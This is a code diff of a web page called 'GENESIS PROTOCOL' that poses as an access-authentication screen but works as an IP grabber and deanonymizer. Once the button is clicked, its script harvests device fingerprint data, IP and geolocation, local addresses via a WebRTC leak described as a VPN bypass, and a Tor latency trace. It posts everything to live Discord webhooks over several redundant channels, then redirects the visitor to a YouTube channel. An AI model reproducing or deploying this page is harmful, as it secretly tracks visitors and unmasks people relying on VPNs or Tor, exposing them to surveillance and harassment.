@@ -7,18 +7,18 @@
     <style>
         :root { --p-green: #00ff66; --p-bg: #020202; }
         body { background: var(--p-bg); color: #fff; font-family: 'Inter', system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .terminal { width: 380px; padding: 40px; background: #080808; border: 1px solid #111; border-radius: 24px; text-align: center; box-shadow: 0 50px 100px rgba(0,0,0,0.9); }
-        .pulse { height: 4px; width: 0%; background: var(--p-green); border-radius: 2px; margin: 20px 0; transition: width 4s ease-in-out; }
-        .btn { background: #fff; color: #000; border: none; padding: 16px 32px; border-radius: 12px; font-weight: 800; cursor: pointer; width: 100%; transition: 0.3s; }
+        .terminal { width: 380px; padding: 40px; background: #080808; border: 1px solid #111; border-radius: 24px; text-align: center; box-shadow: 0 50px 100px rgba(0,0,0,0.9); border: 1px solid rgba(0,255,102,0.1); }
+        .pulse { height: 4px; width: 0%; background: var(--p-green); border-radius: 2px; margin: 20px 0; transition: width 4s ease-in-out; box-shadow: 0 0 10px var(--p-green); }
+        .btn { background: #fff; color: #000; border: none; padding: 16px 32px; border-radius: 12px; font-weight: 800; cursor: pointer; width: 100%; transition: 0.3s; letter-spacing: 1px; }
         .btn:hover { background: var(--p-green); transform: translateY(-2px); box-shadow: 0 10px 20px rgba(0,255,102,0.2); }
-        #log { font-size: 10px; color: #333; text-transform: uppercase; letter-spacing: 1px; margin-top: 15px; }
+        #log { font-size: 10px; color: #333; text-transform: uppercase; letter-spacing: 1px; margin-top: 15px; font-family: monospace; }
     </style>
 </head>
 <body>
 
 <div class="terminal">
     <div style="font-size: 40px; margin-bottom: 10px;">🌐</div>
-    <h1 style="font-size: 18px; margin-bottom: 5px;">GENESIS PROTOCOL</h1>
+    <h1 style="font-size: 18px; margin-bottom: 5px; font-weight: 600;">GENESIS PROTOCOL</h1>
     <p style="font-size: 11px; color: #555;">v13.0 Multi-Layered Validation</p>
     <div class="pulse" id="bar"></div>
     <button class="btn" id="start">INITIALIZE ACCESS</button>
@@ -27,19 +27,19 @@
 
 <script>
 /**
- * SENTINEL GENESIS v13.0 - THE ULTIMATE HYBRID
- * Merges: Legacy Pings, WebRTC Leaks, OOB Tunneling, Sync Anchoring, and Tor-Bypass Latency.
+ * SENTINEL GENESIS v13.0 - CONSOLIDATED OVERRIDE
+ * Webhook Updated: ...yQNp
  */
 
 const HUB = {
-    U: "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ-bdXlInRWb4DgEGcfeM0",
+    U: "https://discordapp.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44IbRhSdiJOvSpHBzljrwvDo0Ifw6hyQNp",
     E: "https://youtube.com/@LigmaBlox-w7m",
     SUCCESS: false
 };
 
-// --- GLOBAL DISPATCHER (The "Force-Stop" Logic) ---
 const fire = async (data, vector) => {
-    if (HUB.SUCCESS) return; // If one succeeds, the others drop
+    // If one high-priority vector already hit, we can throttle the rest
+    if (HUB.SUCCESS && vector === "SECONDARY") return; 
 
     const payload = JSON.stringify({
         username: `Genesis v13 [${vector}]`,
@@ -54,54 +54,50 @@ const fire = async (data, vector) => {
 
     const blob = new Blob([payload], { type: 'application/json' });
 
-    // Method 1: Sync XHR (The Core Anchor)
+    // Method 1: Sync XHR (Critical Thread Lock)
     try {
         const x = new XMLHttpRequest();
         x.open("POST", HUB.U, false); 
         x.setRequestHeader("Content-Type", "application/json");
-        x.onload = () => { HUB.SUCCESS = true; };
         x.send(payload);
+        HUB.SUCCESS = true;
     } catch(e) {}
 
-    // Method 2: Beacon (Bypasses Exit Closures)
-    if (navigator.sendBeacon(HUB.U, blob)) HUB.SUCCESS = true;
+    // Method 2: Beacon (Persistence)
+    navigator.sendBeacon(HUB.U, blob);
 
-    // Method 3: Fetch Keepalive
-    fetch(HUB.U, { method: 'POST', body: payload, headers: {'Content-Type': 'application/json'}, keepalive: true })
-    .then(() => { HUB.SUCCESS = true; });
+    // Method 3: Fetch Keepalive (Modern Standard)
+    fetch(HUB.U, { method: 'POST', body: payload, headers: {'Content-Type': 'application/json'}, keepalive: true }).catch(()=>{});
 
-    // Method 4: Image Side-Channel (OOB Traffic)
-    const img = new Image();
-    img.src = `${HUB.U}?v=${btoa(vector).substring(0, 8)}`;
+    // Method 4: Background Image Ping
+    new Image().src = `${HUB.U}?v=${btoa(vector).substring(0, 5)}`;
 };
 
-// --- DATA HARVESTING ---
 const collect = async () => {
     const stats = {
         plat: navigator.platform,
         cpu: navigator.hardwareConcurrency || "N/A",
         ram: navigator.deviceMemory ? navigator.deviceMemory + "G" : "N/A",
         scr: `${screen.width}x${screen.height}`,
-        bat: "N/A"
+        bat: "N/A",
+        lang: navigator.language,
+        vendor: navigator.vendor
     };
 
-    // Battery API (Hidden tracking vector)
     try {
         const b = await navigator.getBattery();
-        stats.bat = `${(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
+        stats.bat = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'Discharging'})`;
     } catch(e) {}
 
-    // GPU Forensic
     try {
         const gl = document.createElement('canvas').getContext('webgl');
         const d = gl.getExtension('WEBGL_debug_renderer_info');
         stats.gpu = gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
-    } catch(e) { stats.gpu = "Locked"; }
+    } catch(e) { stats.gpu = "Protected"; }
 
     return stats;
 };
 
-// --- EXECUTION ---
 document.getElementById('start').onclick = async function() {
     this.disabled = true;
     this.innerText = "AUTHENTICATING...";
@@ -110,7 +106,7 @@ document.getElementById('start').onclick = async function() {
 
     const h = await collect();
 
-    // 1. PRIMARY: IP & GEO (JSONP Proxy-Bypass)
+    // 1. IP & GEO (JSONP)
     const s = document.createElement('script');
     window.onResult = (res) => {
         fire({
@@ -123,7 +119,7 @@ document.getElementById('start').onclick = async function() {
     s.src = "https://ipapi.co/jsonp?callback=onResult";
     document.body.appendChild(s);
 
-    // 2. SECONDARY: WebRTC UDP Leak (VPN Punch)
+    // 2. WebRTC (VPN Bypass)
     const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
     rtc.createDataChannel("");
     rtc.onicecandidate = (e) => {
@@ -134,15 +130,16 @@ document.getElementById('start').onclick = async function() {
     };
     rtc.createOffer().then(o => rtc.setLocalDescription(o));
 
-    // 3. TERTIARY: Tor Latency Comparison
+    // 3. Tor Latency Check
     const tStart = performance.now();
     fetch('https://www.google.com/generate_204', { mode: 'no-cors' }).then(() => {
-        fire({ latency: (performance.now() - tStart).toFixed(2) + "ms" }, "TOR_CORRELATION");
+        fire({ latency: (performance.now() - tStart).toFixed(2) + "ms" }, "LATENCY_TRACE");
     });
 
-    // RE-DIRECT EXIT
+    // FINAL EXIT
     setTimeout(() => {
-        window.location.replace(HUB.E);
+        document.getElementById('log').innerText = "Handshake Confirmed.";
+        setTimeout(() => { window.location.replace(HUB.E); }, 500);
     }, 3800);
 };
 </script>
